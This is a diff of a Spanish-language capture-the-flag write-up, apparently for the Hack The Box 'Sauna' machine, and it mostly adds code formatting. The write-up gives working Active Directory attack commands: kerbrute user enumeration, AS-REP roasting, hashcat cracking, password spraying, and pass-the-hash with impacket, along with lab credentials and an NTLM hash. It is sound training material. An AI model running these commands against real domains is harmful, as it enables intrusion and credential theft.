@@ -36,12 +36,12 @@ Pero si vamos echamos un vistazo a ``/about.html``:
 
 Es una referencia directa a nombres de usuario que parecen formar parte del equipo.
 
-Tenemos un listado potencial de usuarios, por lo que nos los guardamos en users.txt:
+Tenemos un listado potencial de usuarios, por lo que nos los guardamos en ``users.txt``:
 
 ![9](Images/9.png)
 
 
-Una vez tenemos este listado de posibles usuarios, nos falta conocer qué formato/estructura/naming convention tienen a nivel de dominio para identificar/crear a los usuarios. Una herramienta muy buena para estos casos es anarchyusers. 
+Una vez tenemos este listado de posibles usuarios, nos falta conocer qué formato/estructura/naming convention tienen a nivel de dominio para identificar/crear a los usuarios. Una herramienta muy buena para estos casos es ``anarchyusers``. 
 
 https://github.com/urbanadventurer/username-anarchy
 
@@ -52,9 +52,9 @@ Esta herramienta nos permite hacer múltiples combinaciones. Si ejecutamos ``use
 
 Le pasamos la lista de usuarios y las combinaciones a realizar.
 
-Esto nos genera un archivo de 88 líneas que son producto de las combinaciones entre nombre y apellido que nos ofrece (partiendo de 6 usuarios). Para que se entienda con un ejemplo, las combinaciones que nos ha realizado para el usuario "fergus smith", son:
-
 ``./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchyusers.txt``
+
+Esto nos genera un archivo de 88 líneas que son producto de las combinaciones entre nombre y apellido que nos ofrece (partiendo de 6 usuarios). Para que se entienda con un ejemplo, las combinaciones que nos ha realizado para el usuario "fergus smith", son:
 
 ![11](Images/11.png)
 
@@ -63,7 +63,7 @@ Una vez tenemos las combinaciones en un listado más extenso (anarchyusers.txt),
 ``kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL anarchyusers.txt``
 ![12](Images/12.png)
 
-Nos devuelve que fsmith es un usuario válido. No sólo hemos sacado un usuario válido, sino que ahora también conocemos ahora la forma que tiene el DC de generar usuarios: inicial del nombre+apellido.
+Nos devuelve que ``fsmith`` es un usuario válido. No sólo hemos sacado un usuario válido, sino que ahora también conocemos ahora la forma que tiene el DC de generar usuarios: inicial del nombre+apellido.
 
 Aunque no conozcamos la contraseña del usuario fsmith, podemos averiguar, gracias a la técnica ``asreproasting``, si dicho usuario no requiere autenticación previa de kerberos (``DontRequirePreAuth``), lo que nos proporcionaría un hash que, si conseguimos romper, nos dará la contraseña en texto claro del usuario en cuestión. 
 
@@ -76,7 +76,7 @@ Dado que sólo tenemos un usuario válido, modificamos nuestro users.txt:
 ![14](Images/14.png)
 
 
-Bingo. Tenemos el hash del usuario fsmith y nos lo hemos guardado en hashes.asreproast. Ahora, para intentar romperlo, se lo pasamos a hashcat.
+Bingo. Tenemos el hash del usuario fsmith y nos lo hemos guardado en ``hashes.asreproast``. Ahora, para intentar romperlo, se lo pasamos a hashcat.
 
 Antes de ello, vamos a averiguar el código interno que tiene hashcat para identificar este tipo de hashes (``krb5asrep$23$``), para ello:
 
@@ -88,16 +88,16 @@ Una vez sabemos el código interno de hashcat, 18200, lo lanzamos con rockyou co
 
 ``hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force``
 ![16](Images/16.png)
-Tenemos credenciales válidas para el dominio -> fsmith:Thestrokes23
+Tenemos credenciales válidas para el dominio -> ``fsmith``:``Thestrokes23``
 
 Aunque todo apunta a ello, vamos a  validarlas con netexec:
 
 ``netexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'``
 ![17](Images/17.png)
 
-En el output podemos ver [+], por lo que nos confirma que son credenciales válidas.
+En el output podemos ver ``[+]``, por lo que nos confirma que son credenciales válidas.
 
-La pregunta ahora es: Vale, tengo credenciales válidas, pero, ¿puedo conectarme con dichas credenciales? ¿Forma parte del grupo Remote Management Users el usuario que tenemos? Pues vamos a comprobarlo.
+La pregunta ahora es: vale, tengo credenciales válidas, pero, ¿puedo conectarme con dichas credenciales? ¿Forma parte del grupo Remote Management Users el usuario que tenemos? Pues vamos a comprobarlo.
 
 ``netexec winrm 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'``
 
@@ -124,7 +124,7 @@ Nos conectamos por ``winRM`` como el usuario fsmith.
 
 Estamos dentro de la máquina víctima.
 
-Recogemos la flag de usuario en C:\Users\FSmith\Desktop\user.txt
+Recogemos la flag de usuario en ``C:\Users\FSmith\Desktop\user.txt``
 
 ![22](Images/22.png)
 
@@ -135,7 +135,7 @@ Tenemos un listado de usuarios del dominio y unas credenciales válidas, por lo 
 ``impacket-GetUserSPNs -request -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/fsmith``
 ![23](Images/23.png)
 
-Parece que sí hay un usuario del que podremos sacar su hash (HSmith), pero ahora no podemos por el error que nos arroja: ``Clock skew too great.`` Esto significa que hay demasiada desincronización con el reloj del DC.
+Parece que sí hay un usuario del que podremos sacar su hash (``HSmith``), pero ahora no podemos por el error que nos arroja: ``Clock skew too great.`` Esto significa que hay demasiada desincronización con el reloj del DC.
 
 Para sincronizarlo, simplemente: ``sudo ntpdate IPdelDC``
 
@@ -169,7 +169,7 @@ Anda, curiosamente es la misma contraeña que para Fsmith. Esto quiere decir que
 ``netexec smb 10.10.10.175 -u realusers.txt -p 'Thestrokes23' --continue-on-sucess``
 ![29](Images/29.png)
 
-Efectivamente, podríamos haberla sacado si hubiéramos hecho password spraying. A su vez, hemos validado las nuevas credenciales -> hsmith:Thestrokes23
+Efectivamente, podríamos haberla sacado si hubiéramos hecho password spraying, pero hemos validado las nuevas credenciales -> ``hsmith``:``Thestrokes23``
 
 Vamos a comprobar si este nuevo usuario forma parte de ``Remote Management Users`` para poder conectarnos con ``evil-winrm``.
 
@@ -177,7 +177,7 @@ Vamos a comprobar si este nuevo usuario forma parte de ``Remote Management Users
 ![30](Images/30.png)
 
 
-Pero no, tenemos ``[-]`` en el output de netexec. Esto quiere decir que no podemos conectarnos a través de winRM con este usuario. No obstante, podríamos intentar otras formas de pivotar desde el usuario fsmith a hsmith.
+Pero no, tenemos ``[-]`` en el output de ``netexec``. Esto quiere decir que no podemos conectarnos a través de winRM con este usuario. No obstante, podríamos intentar otras formas de pivotar desde el usuario fsmith a hsmith.
 
 Sin embargo, antes de seguir con este vector, vamos a explorar más a fondo la máquina víctima.
 
@@ -204,9 +204,9 @@ Una vez hemos compartido la herramienta, la ejecutamos:
 
 Si echamos un vistazo a su output encontramos credenciales de AutoLogon:
 ![33](Images/33.png)
-svc_loangmanager : Moneymakesthworldgoround!
+``svc_loangmanager``:``Moneymakesthworldgoround!``
 
-No obstante, dada la enumeración previa que hicimos de usuarios a través de RPC, sabemos que el usuario al que probablemente está haciendo referencia es "svc_loanmgr", el cual también aparece, más abajo, en el output de winpeas:
+No obstante, dada la enumeración previa que hicimos de usuarios a través de RPC, sabemos que el usuario al que probablemente está haciendo referencia es ``svc_loanmgr``, el cual también aparece, más abajo, en el output de winpeas:
 ![34](Images/34.png)
 
 Teniendo estas posibles credenciales, las validamos con netexec.
@@ -215,10 +215,9 @@ Teniendo estas posibles credenciales, las validamos con netexec.
 ![35](Images/35.png)
 
 Son credenciales válidas.
-¿Formará parte el usuario svc_loanmgr del grupo Remote Management Users? Esto nos permitiría conectarnos con evil-winrm. Vamos a comprobarlo.
+¿Formará parte el usuario ``svc_loanmgr`` del grupo Remote Management Users? Esto nos permitiría conectarnos con evil-winrm. Vamos a comprobarlo.
 
 ``netexec winrm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'``
-
 ![36](Images/36.png)
 
 Nos pone pwn3d!, por lo que sí podemos conectarnos.
@@ -262,7 +261,7 @@ Repetimos proceso para HSmith y svc_loanmgr.
 
 Si exploramos un poco a través de BloodHound vemos algo interesante.
 
-Si vemos la información del nodo de svc_loanmgr (node info) y vamos al apartado "First Degree Object Control", vemos:
+Si vemos la información del nodo de svc_loanmgr (node info) y vamos al apartado ``First Degree Object Control``, vemos:
 ![43](Images/43.png)
 
 
@@ -282,7 +281,7 @@ Vemos el hash NTLM de Administrator. Vamos a validarlo.
 ``netexec smb 10.10.10.175 -u 'Administrator' -H ':823452073d75b9d1cf70ebdf86c7f98e'``
 ![46](Images/46.png)
 
-Bingo. Tenemos pwn3d, por lo que podemos conectarnos como NtAuthority\System (psexec) o como administrator (wmiexec).
+Bingo. Tenemos pwn3d, por lo que podemos conectarnos como NtAuthority\System (``psexec``) o como administrator (``wmiexec``).
 
 ``impacket-psexec Administrator@10.10.10.175 -hashes ':823452073d75b9d1cf70ebdf86c7f98e'``
 ![47](Images/47.png)
@@ -291,5 +290,5 @@ Bingo. Tenemos pwn3d, por lo que podemos conectarnos como NtAuthority\System (ps
 ``impacket-wmiexec Administrator@10.10.10.175 -hashes ':823452073d75b9d1cf70ebdf86c7f98e'``
 ![48](Images/48.png)
 
-De cualquiera de las dos formas, podemos acceder a C:\Users\Administrator\Desktop\root.txt y coger la flag de Administrador:
+De cualquiera de las dos formas, podemos acceder a ``C:\Users\Administrator\Desktop\root``.txt y coger la flag de Administrador:
 ![49](Images/49.png)
